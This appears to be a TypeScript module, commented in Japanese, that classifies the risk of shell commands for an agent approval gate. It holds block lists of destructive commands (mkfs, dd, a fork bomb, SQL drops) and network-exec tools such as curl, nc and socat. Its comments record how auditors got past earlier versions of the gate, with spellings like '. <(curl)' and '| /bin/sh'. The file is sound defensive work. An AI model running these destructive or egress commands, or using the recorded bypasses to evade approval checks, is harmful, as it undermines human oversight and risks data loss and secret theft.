 *   **sample 先頭語 ≠ 規則の先頭 literal** (`sh -c '…'` / `sudo …` の sample・alternation 綴りのサブコマンドが
 *   先頭 literal・先頭が 2 語連鎖 `A\s+B[^…]*C`・SEC-DB2R4-2 / QA-DB2R3-2) も RED へ反転させる (R4 の Z2/Z4/Z5/Z6 を
 *   coordinated 再注入して実測)。**第 4 軸 (task 01a048cd-95ae)** は sample の**最後の gap クラス metachar
 *   (`|` `;` `&` 改行) 以降の後尾**へ同じ prefix 導出を掛ける: 第 3 軸は「反復した seed が gap クラスに触れない」
 *   前提に依存し、sample が先頭 literal より**前**に除外文字を含む形 (`cd /app && prog … word` /
 *   `sh -c 'echo go; prog … word'` / `cat f | prog … word`) では反復が分断され 2 乗形が線形域
 *   (worst 7.7〜13.5・レンジ表記) に留まって SURVIVED していた (SEC-LN-1) — 後尾から取れば反復しても除外文字を
 *   含まず、7 形 (`&&` / `;` / `|` / 改行前置 / metachar 複数 / 空白なし / `2>&1`) とも RED (61.5〜67.9) へ反転する
 *   (coordinated 再注入で 3 レーン + 実装者が独立実測)。現行 sample に該当形は無いので**ケース数は 110 のまま**で、配線の歯は
 *   per-rule の合成 metachar 前置 cmd (15/17 スキャン regex で非 vacuous) が持つ。**第 4 軸の固有寄与は積集合**
 *   (SEC-LN4-6 / TDA-LN4-4): 先頭 literal が平坦に綴られた規則なら第 1 軸が既に RED (37〜67) なので、第 4 軸が
 *   唯一の検出手段になるのは「source literal が断片化 ∧ 先頭 literal の**前**に gap metachar ∧ マッチ完了の
 *   **後**に gap metachar なし」の積集合に限る。
 *   **第 5 軸 (task 01a05374-36d2-7419-ac3f-4a22c160cbcc・本 PR)** は sample の**各** gap metachar 以降の
 *   **全 suffix** へ同じ prefix 導出を掛ける (第 4 軸の superset・第 4 軸は削除しない)。第 4 軸が閉じたのは
 *   「最後の metachar 以降の後尾が**なお規則を踏む**」sample に限られ、先頭 literal の**前と**マッチ完了の
 *   **後**の両方に metachar がある形 (`cd /app && prog … word | tee log` / `… word; echo done` / 改行後続) では
 *   後尾が規則を踏まず null になって 4 軸すべてを回避していた。全 suffix なら「先頭 literal の直前の metachar で
 *   切った suffix」が必ず候補に入る — E/F/G/L/M の 5 形が **4 軸 SURVIVED (max 7.9〜8.5) → 5 軸 RED
 *   (median 62.7〜64.1)** へ反転する (coordinated 再注入で実測)。現行 sample に該当形は無く**ケース数は 110 のまま**で、
 *   配線の歯は per-rule の合成 cmd `cd /app && <sample> | tee log` (**17/17** で非 vacuous・同じ cmd で第 4 軸は null)。
 *   **閉じた形は実測した形に限る。以下は反証探索 (Z1〜Z10) で列挙できた残余であって網羅の主張ではない** —
 *   ① 末尾 literal が先頭 literal の反復で再構成される規則 (`\bfoo\b[^…]*\bfoo\b`・TDA-DB2R3-2・現行 17 に該当形なし・
 *   第 5 軸でも閉じない)、② 結合検査の文字 universe が有限 (ASCII 95 + 制御 5 + 非 ASCII 分離子 5) で、その外の文字
 *   だけを除外する gap クラスは結合検査を素通りし切り出しも受けない (NBSP で実測・universe は追加のみ)。
 *   旧死角 ③ (gap クラスが test 側 `TAIL_METACHARS` より広い綴り `[^|;&\r\n]` / `[^|;&\n<>]`・正のクラス
 *   `[\w\s-]*`) は seed 軸としては閉じていないが、**結合検査 (task 01a04989-4a0c・本 PR)** が
 *   「全スキャン regex の量化クラスが除外する文字 ⊆ `TAIL_METACHARS`」を assert して**そのような規則の着地自体を
 *   RED にする** (3 形とも当該 assertion で RED を実測・現行 17 は緑)。正のクラスの例外は
 *   `(re.source, class.source)` 対で keyed した明示 exemption 1 件 (`git clean -[a-z]*f`) のみ。
 *   ratio 判定は**両側** (単発比の false green = 2 乗形が 12 回中 1 回緑 / false RED = 全 suite 並走 + 2×nproc 外部
 *   負荷で線形が 26.88 の両方を是正・task 01a05374-36d2-7419-ac3f-4f88be2481fc・本 PR): 3 回計測し
 *   「中央値 < 24 かつ 最大 < 40」で判定する。
 *   vacuity guard は汎用 seed `a ` を除いた派生 seed で
 *   計数し (SEC-DB2R4-3 の恒真を解消)、metatest 自身の縮退 (軸の差し戻し / near-miss 除去 / 数字除外の除去 /
 *   軸 4/5 の区切り集合の縮小 / 両側判定の片側化 / 結合検査 universe の縮小 /
 *   RATIO_MAX 緩和 / 入力幾何の縮小 / guard 無効化 / timeout 短縮) は自己弱化 pin が **pin 済みの綴り (定数宣言 / 使用側 / 宣言個数 census) を触る単独編集の
 *   範囲で** RED にする (SEC-DB2R3-2・計測 helper 本体・`for (const seed of live)` ループ header・pin 自身は非被覆・
 *   coordinated 編集は通る・TDA-LN2-3 /
 *   SEC-LN3-2・残余は task 01a048f6-67a5 v0.9)。**LINEAR metatest の seed 生成 / RATIO_MAX /
 *   timeout の変更は境界ゲートの走査範囲変更 = full 監査既定** (finding-registry・SEC-DB2R3-3)。束縛後の残余コスト (16 KiB 敵対入力・
 *   base 比): risk 経路 ≈ 3.8× / categories 経路 ≈ 7.0× / 承認 hook 経路 ≈ 1.7× (TDA-DB2R2-7 / SEC R2 実測・
 *   良性入力は 1.0×)。
 */
interface LiteralRule {
  /** whole-command スキャン (コマンド文字列そのものに適用)。 */
  readonly re: RegExp;
  /**
   * **追加**スキャン: 正準 quote-aware 分割 (`splitSegments` — 分類器へ渡された `split`) の
   * **segment 単位**で試す正規表現 (省略 = whole-command のみ・現行は mysqladmin 行のみが持つ)。
   *
   * **なぜ 2 本なのか (task 01a0480f-d29a・SEC-DB2-2 ≡ TDA-DB2-2)**: mysqladmin 行の
   * `[^|;&\n]{0,512}` は「区切りを跨がない」を**手書きの字面クラス**で表現しており、正準 splitter を
   * 共有しない第二のパーサだった (`security-gate-reuse-canonical-parser` が禁じる形)。quote 非認識ゆえ
   * 実在の書式 (`-p'a;b'` / `--password='x;y'` / `-p"p&q"` — MySQL の `-p[password]` は shell 特殊文字を
   * 含むとき引用が必須・2026-08-29 上流 doc 確認) と行継続 (`\` + 改行) で境界が分断され、実際には
   * 1 コマンドの `drop` サブコマンドが low へ落ちていた。segment 単位なら区切り判定は正準 splitter が
   * 行う (引用内 / escape 済みの `;` `|` `&` 改行は区切りでない) ので、gap クラスは `[\s\S]` でよい。
   *
   * **whole-command の `re` は base 逐語で残す (非弱化)**: `splitSegments` は redirect の演算子と対象語を
   * segment から**除去**するため、segment 単位だけにすると `mysqladmin status > drop.log`
   * (対象語が elide され `drop` が消える) が base の high から low へ落ちる = 本ブランチが base より
   * 弱くなる。判定は 2 スコープの論理和にして単調な拡張にする (`classifyCommandRisk` の非対称 union と
   * 同方針: 追加のみ・引き下げなし)。両スコープとも `{0,512}` の束縛値は同一 (INV-DB-DROP-BOUND-DOC が
   * regex source から抽出して docs と two-way lock)。
   */
  readonly segmentRe?: RegExp;
  readonly category: PolicyCategory;
  /** risk を high へ押し上げるか (false=category-only)。 */
  readonly high: boolean;
  /**
   * 表示名 (docs / UI の列挙コピーとの two-way lock 用・task 01a0480f-ffca)。db-drop 行は event-model
   * `DB_DROP_LITERAL_FORMS` の要素を持ち、INV-DB-DROP-ENUMERATION が和集合の一致を pin する。分類には使わない。
   */
  readonly labels: readonly string[];
}
/**
 * **規律: 手書きの分離子クラスを新規行に書かない (task 01a04989-4a0c)**。
 *
 * `[^|;&\n]` のような「区切りを跨がない」を字面で表現するクラスは正準 splitter を共有しない**第二の
 * パーサ**で (`security-gate-reuse-canonical-parser` が禁じる形)、引用内 metachar (`-p'a;b'`) や行継続で
 * 境界が分断され high が low へ落ちる (SEC-DB2-2 の実体)。segment 単位の判定が要るなら正準
 * `splitSegments` の segment に適用する `segmentRe` を併記すること。whole-command 側に既存の綴りを
 * **非弱化 backstop** として残すのは可 (mysqladmin 行がその形)。
 *
 * これは docs 上の願いではなく INV-LITERAL-RULES-LINEAR (inv-policy-categories) の**構造ゲート**が
 * 機械的に強制する: `re` の否定文字クラスが `|` `;` `&` 改行のいずれかを列挙する行は `segmentRe` と
 * segment sample (`samples[i].segmentCmd`) を持たなければ RED。さらに全スキャン regex の**量化クラスが
 * 除外する文字**は test 側 `TAIL_METACHARS` に収まっていなければ RED (seed 軸 (4)(5) の切り出しとの結合・
 * 正のクラスの例外は (regex source, class source) 対で keyed した明示 exemption のみ)。
 */
export const LITERAL_RULES: readonly LiteralRule[] = [
  { re: /\bmkfs\b/i, category: "disk-destroy", high: true, labels: ["mkfs"] },
  { re: /\bdd\s+if=/i, category: "disk-destroy", high: true, labels: ["dd if="] },
  { re: /:\(\)\s*\{/, category: "fork-bomb", high: true, labels: [":(){ :|:& };:"] },
  { re: /\bdrop\s+table\b/i, category: "db-drop", high: true, labels: ["DROP TABLE"] },
  { re: /\btruncate\s+table\b/i, category: "db-drop", high: true, labels: ["TRUNCATE TABLE"] },
  { re: /\bdrop\s+database\b/i, category: "db-drop", high: true, labels: ["DROP DATABASE"] },
  { re: /\bdropdb\b/i, category: "db-drop", high: true, labels: ["dropdb"] }, // PostgreSQL CLI 形 (同 class)
  // task 01a0440b (TDA-DB-6): 他エンジン / 他粒度の同 class。追加のみ (削除禁止規律)。
  { re: /\bdrop\s+schema\b/i, category: "db-drop", high: true, labels: ["DROP SCHEMA"] }, // PostgreSQL schema 粒度 / MySQL の DATABASE 同義
  { re: /\bdrop\s+owned\s+by\b/i, category: "db-drop", high: true, labels: ["DROP OWNED BY"] }, // PostgreSQL: role 所有物の一括 drop
  {
    re: /\bmysqladmin\b[^|;&\n]{0,512}\bdrop\b/i,
    segmentRe: /\bmysqladmin\b[\s\S]{0,512}\bdrop\b/i,
    category: "db-drop",
    high: true,
    labels: ["mysqladmin … drop"],
  }, // MySQL CLI 形 (正準 segment 単位が主・whole-command は非弱化 backstop・512 字で束縛 = 線形)
  {
    re: /\bdrop_?database\s*\(/i,
    category: "db-drop",
    high: true,
    labels: ["dropDatabase(", "drop_database("],
  }, // mongosh db.dropDatabase() / pymongo・sqlalchemy-utils drop_database(
  { re: /\bflush(?:all|db)\b/i, category: "db-drop", high: true, labels: ["FLUSHALL", "FLUSHDB"] }, // redis FLUSHALL / FLUSHDB (bare-token・dropdb と同じ FP class)
  { re: /\bmigrate\b/i, category: "migrate-prod", high: true, labels: ["migrate"] },
  { re: /\bproduction\b/i, category: "migrate-prod", high: true, labels: ["production"] },
  {
    re: /\bgit\s+reset\s+--hard\b/i,
    category: "history-rewrite",
    high: true,
    labels: ["git reset --hard"],
  },
  {
    re: /\bgit\s+clean\s+-[a-z]*f/i,
    category: "history-rewrite",
    high: true,
    labels: ["git clean -f"],
  },
];

/** segment スコープを適用しない走査 (legacy union パス) 用の空集合。 */
const NO_SEGMENTS: readonly string[] = [];

/**
 * 1 ルールのスキャンを実行する **単一出所** (risk 側 `matchesHighRiskLiteral` と category 側
 * `addCommandLevelCategories` が共有する。片方だけがスコープを見る drift を構造的に不能にする)。
 *
 * whole-command (`re`) と正準 segment 単位 (`segmentRe`・省略可) の**論理和**。segments は分類器が
 * 既に計算した `split(command)` をそのまま渡す (同一走査・二度割らない)。
 */
function literalRuleMatches(
  rule: LiteralRule,
  command: string,
  segments: readonly string[],
): boolean {
  if (rule.re.test(command)) return true;
  const segmentRe = rule.segmentRe;
  return segmentRe !== undefined && segments.some((seg) => segmentRe.test(seg));
}

/** 字面 high リテラルにマッチするか (LITERAL_RULES の high エントリの論理和・旧 HIGH_RISK_LITERAL_RE と同値)。 */
function matchesHighRiskLiteral(command: string, segments: readonly string[]): boolean {
  return LITERAL_RULES.some((rule) => rule.high && literalRuleMatches(rule, command, segments));
}

/**
 * コマンド risk の公開判定 (承認ゲートの唯一の根拠)。
 *
 * SEC-CQ-1 (2026-08-14 R1 監査 H) の**非対称 union backstop**: quote-aware 分割 (primary) を
 * 基本としつつ、旧 quote 非対応分割でも一度分類し、**旧側が high のときのみ high へ引き上げる**。
 * - quote-aware 側の解析ミス (phantom quote parity / heredoc 誤認等) がどう転んでも、旧分類器が
 *   high と呼んだ入力は high に留まる = 旧実装比で false-negative を構造的に導入しない。
 * - 旧側の **medium は引き上げない** (非対称): 引用内演算子の分割断片が生む medium 床上げは
 *   まさに偽陽性インシデントの原因で、それを復活させないため。`rg -n 'a|b.*[Cc]' src` は
 *   旧 medium だが low を維持し、旧 high (`echo it's; rm -rf /; echo don't` 系) は high に戻る。
 */
export function classifyCommandRisk(command: string): RiskLevel {
  const primary = classifyCommandRiskInternal(command, 0, undefined, splitSegments);
  if (primary === "high") return "high";
  const legacy = classifyCommandRiskInternal(command, 0, undefined, splitSegmentsQuoteUnaware);
  return legacy === "high" ? "high" : primary;
}

/**
 * 承認ポリシー (ADR 019f0c3e) 用: コマンドの risk と該当 high-risk カテゴリを **同一走査**で算出する。
 *
 * カテゴリは `classifyCommandRisk` と同じ検出点・同じ述語・同じ正規化から収集する単一ソースで、別パーサを
 * 並置しない (memory consolidation-invariant-sweep / security-gate-reuse-canonical-parser)。
 * **high⟹必ず≥1 category** (named に該当しない high は high-risk-other を付与) を backstop で保証し、
 * 「high だが無カテゴリ＝ポリシーゲート素通り」の silent hole を構造的に不能にする。
 *
 * risk は `classifyCommandRisk` と同値 (内部の early-return を full-scan へ変えても「high が1つでもあれば
 * high」という戻り値は不変)。
 */
export function classifyCommandWithCategories(command: string): {
  risk: RiskLevel;
  categories: Set<PolicyCategory>;
} {
  const categories = new Set<PolicyCategory>();
  let risk = classifyCommandRiskInternal(command, 0, categories, splitSegments);
  // SEC-CQ-1 非対称 union (classifyCommandRisk と同一規則): 旧分割が high のときのみ引き上げ、
  // その際は旧走査の named categories (recursive-rm 等) も合流させる (bypass/YOLO の
  // DEFAULT_GATED 照合と監査証跡を legacy 検出に追随させる)。
  // SEC-CQ2-2 (CQ-R2 監査 M): legacy 評価を「primary が high でないとき」に限らず**無条件**に行う。
  // primary が全文 LITERAL rule で先に high になったケースでも legacy 専用の named category
  // (例: `git reset --hard ; (true)#…\nrm -rf /tmp/x` の recursive-rm) を落とさない —
  // 落とすと出荷 preset (demo) の bypass gate 照合が base 実装より弱くなる。
  {
    const legacyCategories = new Set<PolicyCategory>();
    const legacy = classifyCommandRiskInternal(
      command,
      0,
      legacyCategories,
      splitSegmentsQuoteUnaware,
    );
    if (legacy === "high") {
      risk = "high";
      for (const category of legacyCategories) categories.add(category);
    }
  }
  // backstop: high と判定されたのに named category が付かなかった残余を取りこぼさない (silent hole 防止)。
  if (risk === "high" && categories.size === 0) categories.add("high-risk-other");
  return { risk, categories };
}

/** コマンドの high-risk カテゴリ集合のみを返す薄 wrap (approval-bridge のポリシー照合用)。 */
export function classifyCommandCategories(command: string): Set<PolicyCategory> {
  return classifyCommandWithCategories(command).categories;
}

/**
 * network-egress (外部へデータを送出しうる) program を起動するか (secret-egress カテゴリの composite 片側)。
 * approval-bridge が `isNetworkEgressCommand(cmd) && detectSecretInInput(...)` で secret-egress を確定する。
 * 分類器と同一の tokenize/skipCommandPrefixWords/stripRunnerWrappers/commandName/normalizeCommandName で
 * 正規化し、path/quote/wrapper/version 接尾辞 非依存に basename を照合する (`/usr/bin/curl`/`'curl'`/`sudo curl`)。
 */
/**
 * network-exec program (basename) の **単一ソース** (TDA-2)。外部へ到達/データ送出しうる転送・リモート
 * 実行ツール。secret-egress 判定 (`isNetworkEgressCommand` / NETWORK_EGRESS_PROGRAMS) と永続化 deny
 * (`PERSIST_DENY_PROGRAMS` の network-exec 区画) が **この同一配列**を参照し、逐語複製による drift を排除する。
 * 追加/削除は本配列のみで行う (両 consumer が自動追随・INV-NETWORK-EXEC-SINGLE-SOURCE が ⊆ を固定)。
 */
export const NETWORK_EXEC_PROGRAMS: readonly string[] = [
  "curl",
  "wget",
  "nc",
  "ncat",
  "netcat",
  "socat",
  "ssh",
  "scp",
  "sftp",
  "ftp",
  "telnet",
];
const NETWORK_EGRESS_PROGRAMS: ReadonlySet<string> = new Set(NETWORK_EXEC_PROGRAMS);
export function isNetworkEgressCommand(command: string): boolean {
  if (typeof command !== "string" || command.length === 0) return false;
  // SEC-CQ-1: quote-aware と旧分割の**両方**を走査する (union・over-detect 方向が安全側)。
  // phantom quote parity で新分割が egress program を segment 先頭から失っても、旧分割側が拾い、
  // secret-egress composite (egress ∧ inline secret) の片側が silent に消えない。
  // **長さガード (SEC-CQ11-3・R11 監査 M)**: risk 経路は `MAX_ANALYZABLE_COMMAND_LEN` 超で high へ
  //   bail するが、こちらにはガードが無く、>16 KiB の redirect 連打で `splitSegments` が超線形
  //   (1 MiB で 25 秒) のまま同期 hook パスに露出していた。解析不能に巨大な入力は egress と見なす
  //   (composite secret-egress の片側を閉じない = 安全側)。
  if (command.length > MAX_ANALYZABLE_COMMAND_LEN) return true;
  const isEgressProgram = (tokens: string[]): boolean =>
    tokens.length > 0 && NETWORK_EGRESS_PROGRAMS.has(normalizeCommandName(commandName(tokens)));
  const scan = (segments: string[]): boolean => {
    for (const seg of segments) {
      const { tokens } = programTokens(tokenize(seg));
      if (isEgressProgram(tokens)) return true;
      // コマンド語が置換なら平坦化した形も見る (SEC-CQ11-1・加算のみ)。
      if (
        hasCommandWordSubstitution(tokens[0]) &&
        isEgressProgram(programTokens(tokenize(flattenCommandSubstitutions(seg))).tokens)
      )
        return true;
    }
    return false;
  };
  return scan(splitSegments(command)) || scan(splitSegmentsQuoteUnaware(command));
}

/**
 * 字面 high と同等の command-level カテゴリを付与する (ADR 019f0c3e / TDA-1)。
 * risk 判定 (`matchesHighRiskLiteral`) と **同一の LITERAL_RULES テーブル**を走査するため、片方だけ更新
 * する drift が構造的に不能 (字面 high⟹≥1 category を同テーブルで担保)。`high: false` (category-only)
 * エントリがあれば superset になるが、現行テーブルは全エントリ high (task 01a03b76 以降・上の docstring
 * 参照)。categories 未指定時 (classifyCommandRisk 経路) は no-op (behavior 非退行)。
 */
function addCommandLevelCategories(
  command: string,
  segments: readonly string[],
  categories?: Set<PolicyCategory>,
): void {
  if (categories === undefined) return;
  for (const rule of LITERAL_RULES) {
    if (literalRuleMatches(rule, command, segments)) categories.add(rule.category);
  }
}

/**
 * 永続化適格判定の **構造ゲート** (ADR 019ee0c0 / SEC-1/1a/1b/1c)。承認の再起動跨ぎ永続化
 * (allow_for_session + persist) の対象を「**構造的に単純で危険 program を含まない** medium コマンド」に
 * 限定する。承認ゲート自体は不変 (毎回 / セッション内 確認は可能) で「再起動後も無人 auto-allow」だけを禁じる。
 *
 * SEC が 3 連続 (SEC-1/1a/1b) で denylist のバイパス (`node -e`/`. <(curl)`/`| /bin/sh`/backtick/
 * `\sudo`/`python3.11 -c`/`'sudo'`/`find -exec +`) を実証した。根因は **persist ゲートが分類器とは別の
 * 手書きパーサを使い正規化が乖離する**こと。そこで `isPersistDeniedCommand` (下記) が分類器と同一の
 * tokenize/commandName/normalizeCommandName/isCleanExecutableToken を共有して乖離を構造的に排除する。
 *
 * SHELL_COMPOSITION_RE = 合成メタ文字 (`| & ; $ \` ( ) { } < > 改行`)。これを含むコマンドはパイプ
 * (curl|sh・絶対パス/任意シェル含む)・コマンド置換 (`$(...)`/backtick)・プロセス置換 (`<(...)`)・連結
 * (`&&`/`;`)・リダイレクト・サブシェルのいずれかゆえ **語彙非依存で永続不可**にする (新シェル名や新 DL
 * ツールが来ても閉じたまま)。ReDoS 安全: 文字クラス 1 個 (backtracking なし・redaction-redos 教訓)。
 */
const SHELL_COMPOSITION_RE = /[|&;$`(){}<>\n]/;

/**
 * 永続化を許さない program (basename)。合成メタ文字を含まない平坦コマンドの残余危険源。
 * 権限昇格 / インタプリタ inline (任意コード) / 公開 (不可逆) / network-exec (供給鎖) / shell 起動 / ラッパ。
 */
const PERSIST_DENY_PROGRAMS: ReadonlySet<string> = new Set([
  // 権限昇格・ラッパ (実体プログラムを後置で隠す)。
  "sudo",
  "su",
  "doas",
  "pkexec",
  "run0",
  "env",
  "command",
  "exec",
  "eval",
  "source",
  ".",
  "xargs",
  "nice",
  "ionice",
  "timeout",
  // TDA-CQ11-6 (R11 監査 M): `RUNNER_WRAPPERS` の全要素は永続 deny でもある (`time chown -R …` /
  //   `builtin …` がラッパ剥がしで分類器には届くのに永続ゲートを素通りしていた)。包含は INV で固定。
  "time",
  "builtin",
  "watch",
  "setsid",
  "stdbuf",
  "nohup",
  "chroot",
  "unshare",
  // R17: RUNNER_WRAPPERS に足したラッパは永続 allowlist の構造ゲートでも deny する (M8 の ⊆ INV)。
  "taskset",
  "flock",
  "script",
  "busybox",
  "toybox",
  // shell 起動 (inline -c / スクリプト実行)。
  "sh",
  "bash",
  "zsh",
  "dash",
  "ksh",
  "fish",
  "csh",
  "tcsh",
  "ash",
  // 言語インタプリタ inline (-e/-c/-r で任意コード)。
  "node",
  "nodejs",
  "deno",
  "bun",
  "ts-node",
  "tsx",
  "python",
  "python2",
  "python3",
  "pypy",
  "pypy3",
  "perl",
  "ruby",
  "php",
  "lua",
  "luajit",
  "Rscript",
  "groovy",
  "scala",
  // パッケージ runner / 公開 (任意 script 実行・不可逆公開)。
  "npm",
  "pnpm",
  "yarn",
  "npx",
  "pnpx",
  "bunx",
  // ビルド/タスク runner (任意 target を exec)。
  "make",
  "cmake",
  "gradle",
  "gradlew",
  "mvn",
  "ant",
  "bazel",
  "task",
  "just",
  // コンテナ / オーケストレータ (任意 entrypoint exec)。
  "docker",
  "podman",
  "nerdctl",
  "kubectl",
  "helm",
  "compose",
  // network-exec (供給鎖 / リモート実行)。TDA-2: NETWORK_EXEC_PROGRAMS を単一ソースとして spread
  //   (secret-egress 判定 isNetworkEgressCommand と同一集合・逐語複製しない)。
  ...NETWORK_EXEC_PROGRAMS,
  // 破壊的ファイルシステム / システム mutator (SEC-5/SEC-6・ADR 019ee0c0)。
  //   chown/chgrp は唯一の medium-destructive 操作で**不可逆** (元の所有者マップ喪失) → 永続不可必須 (SEC-5)。
  //   他は現状 high で非 persistable だが、将来の risk 再分類に対する防御多層 backstop (SEC-6)。
  //   program 名 deny ゆえ非再帰 chown(low・元々非persistable) を over-gate しない (degrade も session のみ)。
  "chown",
  "chgrp",
  "chmod",
  "rm",
  "rmdir",
  "dd",
  "shred",
  "truncate",
  "mv",
  "ln",
  "mkfs",
  "mount",
  "umount",
  "kill",
  "pkill",
  "killall",
  "crontab",
  "at",
  // SEC-8: 権限/属性/セキュリティコンテキスト mutator + 特権配置。いずれも**常に変更系**で良性な
  //   read 形を持たない (read は getfacl/lsattr/ls -Z)。現状 low ゆえ persist 経路に来ないが、
  //   chmod/chown と同クラスの backstop として deny を明示 (将来 medium 再分類でも over-gate=安全側のみ)。
  //   sed -i / cp -rf / tar -x / rsync --delete 等の **flag 条件付き** 破壊形は、支配的に良性な
  //   read/copy 形 (sed ''/cp/tar -c/rsync) を blanket program-deny で過剰 gate しないため**非追加**
  //   (現状すべて low=非 gated)。medium 再分類時は flag 認識 deny が必要 (mv が deny で cp が非 deny の前例と同方針)。
  "install",
  "setfacl",
  "chattr",
  "chcon",
]);

/** find が -exec/-execdir/-ok/-okdir で任意コマンドを起動するか (SEC-1c)。-delete のみは永続可。 */
function findUsesExec(tokens: string[]): boolean {
  if (commandName(tokens) !== "find") return false;
  return tokens
    .slice(1)
    .some((t) => t === "-exec" || t === "-execdir" || t === "-ok" || t === "-okdir");
}

/**
 * medium-risk でも **永続化不可** か (true=永続不可・session-only に degrade)。
 *
 * SEC 3 連続所見 (SEC-1/1a/1b) の根因は「persist ゲートが分類器とは別の手書きパーサを使い正規化が
 * 乖離する」こと (`\sudo` / `python3.11 -c` / `'sudo'` / `find -exec +` が片側だけ素通り)。本実装は
 * **分類器と同一のトークン化/正規化を共有**して乖離を構造的に排除する:
 *  1. SHELL_COMPOSITION_RE: 合成メタ文字 (パイプ/置換/連結/リダイレクト/サブシェル) を語彙非依存で排除。
 *  2. tokenize: 分類器と同じトークナイザ (クォートを正規化し `'sudo'`→`sudo`)。
 *  3. isCleanExecutableToken: 先頭 program がクリーン実行可能名でない (`\sudo` / `$X` 等) → 構造判定不能
 *     ゆえ fail-safe deny (分類器が unanalyzable を medium 床上げするのと同一基準・SEC-1b)。
 *  4. findUsesExec: find -exec/-execdir/-ok は任意コマンド実行 → deny (-delete のみ許容・SEC-1c)。
 *  5. PERSIST_DENY_PROGRAMS: commandName(path/大小文字) + normalizeCommandName(version 接尾辞) で正規化した
 *     basename を集合照合 (`/usr/bin/sudo`→sudo / `python3.11`→python・TDA-6)。
 *
 * ReDoS 安全: 文字クラス test + 既存トークナイザ (有界) のみ。承認分類 (classifyCommandRisk) は不変。
 */
export function isPersistDeniedCommand(command: string): boolean {
  if (typeof command !== "string" || command.length === 0) return true; // fail-safe
  if (SHELL_COMPOSITION_RE.test(command)) return true; // 合成/置換/連結/リダイレクト/サブシェル
  const tokens = tokenize(command);
  const first = tokens[0];
  if (first === undefined) return true; // fail-safe (空/空白のみ)
  // SEC-1b: 先頭 program がクリーン実行可能名でない (\sudo / $X / メタ混入) → 構造判定不能 → deny。
  if (!isCleanExecutableToken(first)) return true;
  // SEC-1c: find -exec 系は任意コマンド実行。
  if (findUsesExec(tokens)) return true;
  // SEC-7/SEC-3: 破壊的ディスク/FS program (mkfs ファミリ + DESTRUCTIVE_DISK_PROGRAMS) と
  //   破壊サブコマンド (nvme format / zfs destroy / hdparm --security-erase…)。現状 classify-high ゆえ
  //   そもそも persist 候補に来ないが、将来 risk 再分類に対する防御多層 backstop として deny を明示
  //   (classify gate と同一述語を共有し DRY・SEC-5/SEC-6 の chown/rm/dd backstop と同方針)。
  if (isDestructiveDiskProgram(tokens) || isDestructiveDiskSubcommand(tokens)) return true;
  // 危険 program (path/version/quote 正規化後の basename)。分類器と同一の正規化を共有 (SEC-1b/TDA-6)。
  return PERSIST_DENY_PROGRAMS.has(normalizeCommandName(commandName(tokens)));
}

/**
 * classifyCommandRisk の本体 (depth 付き)。
 *
 * depth: SEC-1 のインラインコード/コマンド置換の内側を再帰再分類する際の深さ。
 * MAX_INLINE_DEPTH で有界化し、`$(...)` をネストした病的入力でも無限再帰しない。
 */
function classifyCommandRiskInternal(
  command: string,
  depth: number,
  categories: Set<PolicyCategory> | undefined,
  // SEC-CQ-1 union backstop 用: legacy 評価パスは splitSegmentsQuoteUnaware を全再帰レベルへ
  // 一様に伝播させる (= 8cbde70 時点の分類器と同一の走査)。
  // TDA-CQ2-1 (CQ-R2 監査 M): default 引数を持たない**必須**パラメータ。default があると
  // 再帰/委譲の 1 箇所で split の引き回しを落としても型・テスト両緑のまま素通りし、
  // union の legacy 側が quote-aware 分割へ静かに退化する (mutation 10 種中 9 SURVIVED の実測)。
  split: SegmentSplitter,
): RiskLevel {
  if (typeof command !== "string" || command.length === 0) return "high"; // fail-safe
  if (command.length > MAX_ANALYZABLE_COMMAND_LEN) return "high"; // 解析不能に巨大 → fail-safe high
  if (depth >= MAX_INLINE_DEPTH) {
    // 再帰上限到達 → 分類不能を gated に倒す。
    // **category の床も置く (SEC-R7-2・R7 監査 H)**: risk だけ medium にしても、bypass/YOLO は
    //   risk 非依存の category 駆動なので空集合だと defer = 実行される。しかも benign 起動の
    //   process-sub 経路は呼び出し側が risk を捨てるため、通常モードすら守られない。
    //   R6 は上限を実質 2 段→4 段へ動かしただけで、この「無言の失敗」自体は閉じていなかった。
    //   多重ラッパで実コマンドを隠した `capExhausted` と同じ扱いに揃える。
    categories?.add("high-risk-other");
    return "medium";
  }

  // ADR 019f0c3e: category 収集を完全にするため high で **early-return せず full-scan** で risk を集約する。
  //   戻り値は従来 (high が1つでも見つかれば high) と**同値**＝classifyCommandRisk 非退行 (既存テストが guard)。
  //   `categories?.add(...)` は categories 未指定 (classifyCommandRisk 経路) では no-op ゆえ副作用ゼロ。
  let risk: RiskLevel = "low";
  const bump = (r: RiskLevel | undefined): void => {
    if (r === "high") risk = "high";
    else if (r === "medium" && risk !== "high") risk = "medium";
  };

  // segment 分割は **1 回だけ**行い、字面ルールの segment スコープ (`segmentRe`) と下の segment ループで
  //   同一の走査結果を共有する (二度割らない / 走査のズレを作らない)。
  const segments = split(command);
  // **segment スコープは正準 (quote-aware) 分割の結果にのみ適用する**: SEC-CQ-1 の非対称 union は
  //   「quote-aware 側の**解析ミス**を旧分割で補う」ための backstop であって、境界を広げる役ではない。
  //   旧分割は redirect 演算子を除去せず (`&>` は区切りでも語でもないまま segment に残る) 粗い segment を
  //   作るため、legacy 側にも segmentRe を掛けると `mysqladmin status &> drop.log` のような
  //   **redirect 先ファイル名**まで high になり、意図した拡張 (引用内 metachar / 行継続) を超えて
  //   base から乖離する (実測 107→本条件で縮小)。legacy 側は base 逐語の whole-command スキャンのみ。
  //   **例外 (SEC-MA-1・over-gate のみ / 弱化なし)**: 判定は splitter の **identity** なので、
  //   `splitSegments` が構造解析不能 (未終端 quote / heredoc 等) と判断したときは
  //   `splitSegmentsUnparseable` = 旧粗分割 + **command 全体** が返り、segment スコープが legacy 形の
  //   テキストと command 全体にも当たる。つまり解析不能入力では引用内の区切りを跨いだ `drop` も gate
  //   される (fail-closed) — 分類器全体の「解析不能は over-gate 方向」と同じ向きで、INV-DB-DROP-RISK-VERDICT
  //   が挙動として pin する。
  const segmentScoped = split === splitSegments ? segments : NO_SEGMENTS;
  // 字面 high (LITERAL_RULES の high エントリ)。risk と category を**同一テーブル**から付与する (TDA-1)。
  //   category 側は high:false エントリも含む superset (現行テーブルでは全エントリ high)。
  if (matchesHighRiskLiteral(command, segmentScoped)) bump("high");
  addCommandLevelCategories(command, segmentScoped, categories);
  if (BLOCK_DEVICE_RE.test(command) && /[<>]|dd\b/i.test(command)) {
    bump("high");
    categories?.add("disk-destroy");
  }

  // SEC-1 #4: シェル/インタプリタ + プロセス置換 `<(...)`/`>(...)`。ここで明示的に中身を再分類し
  //   破壊的なら high を拾う。再分類不能でも medium に床上げ (fail-safe)。
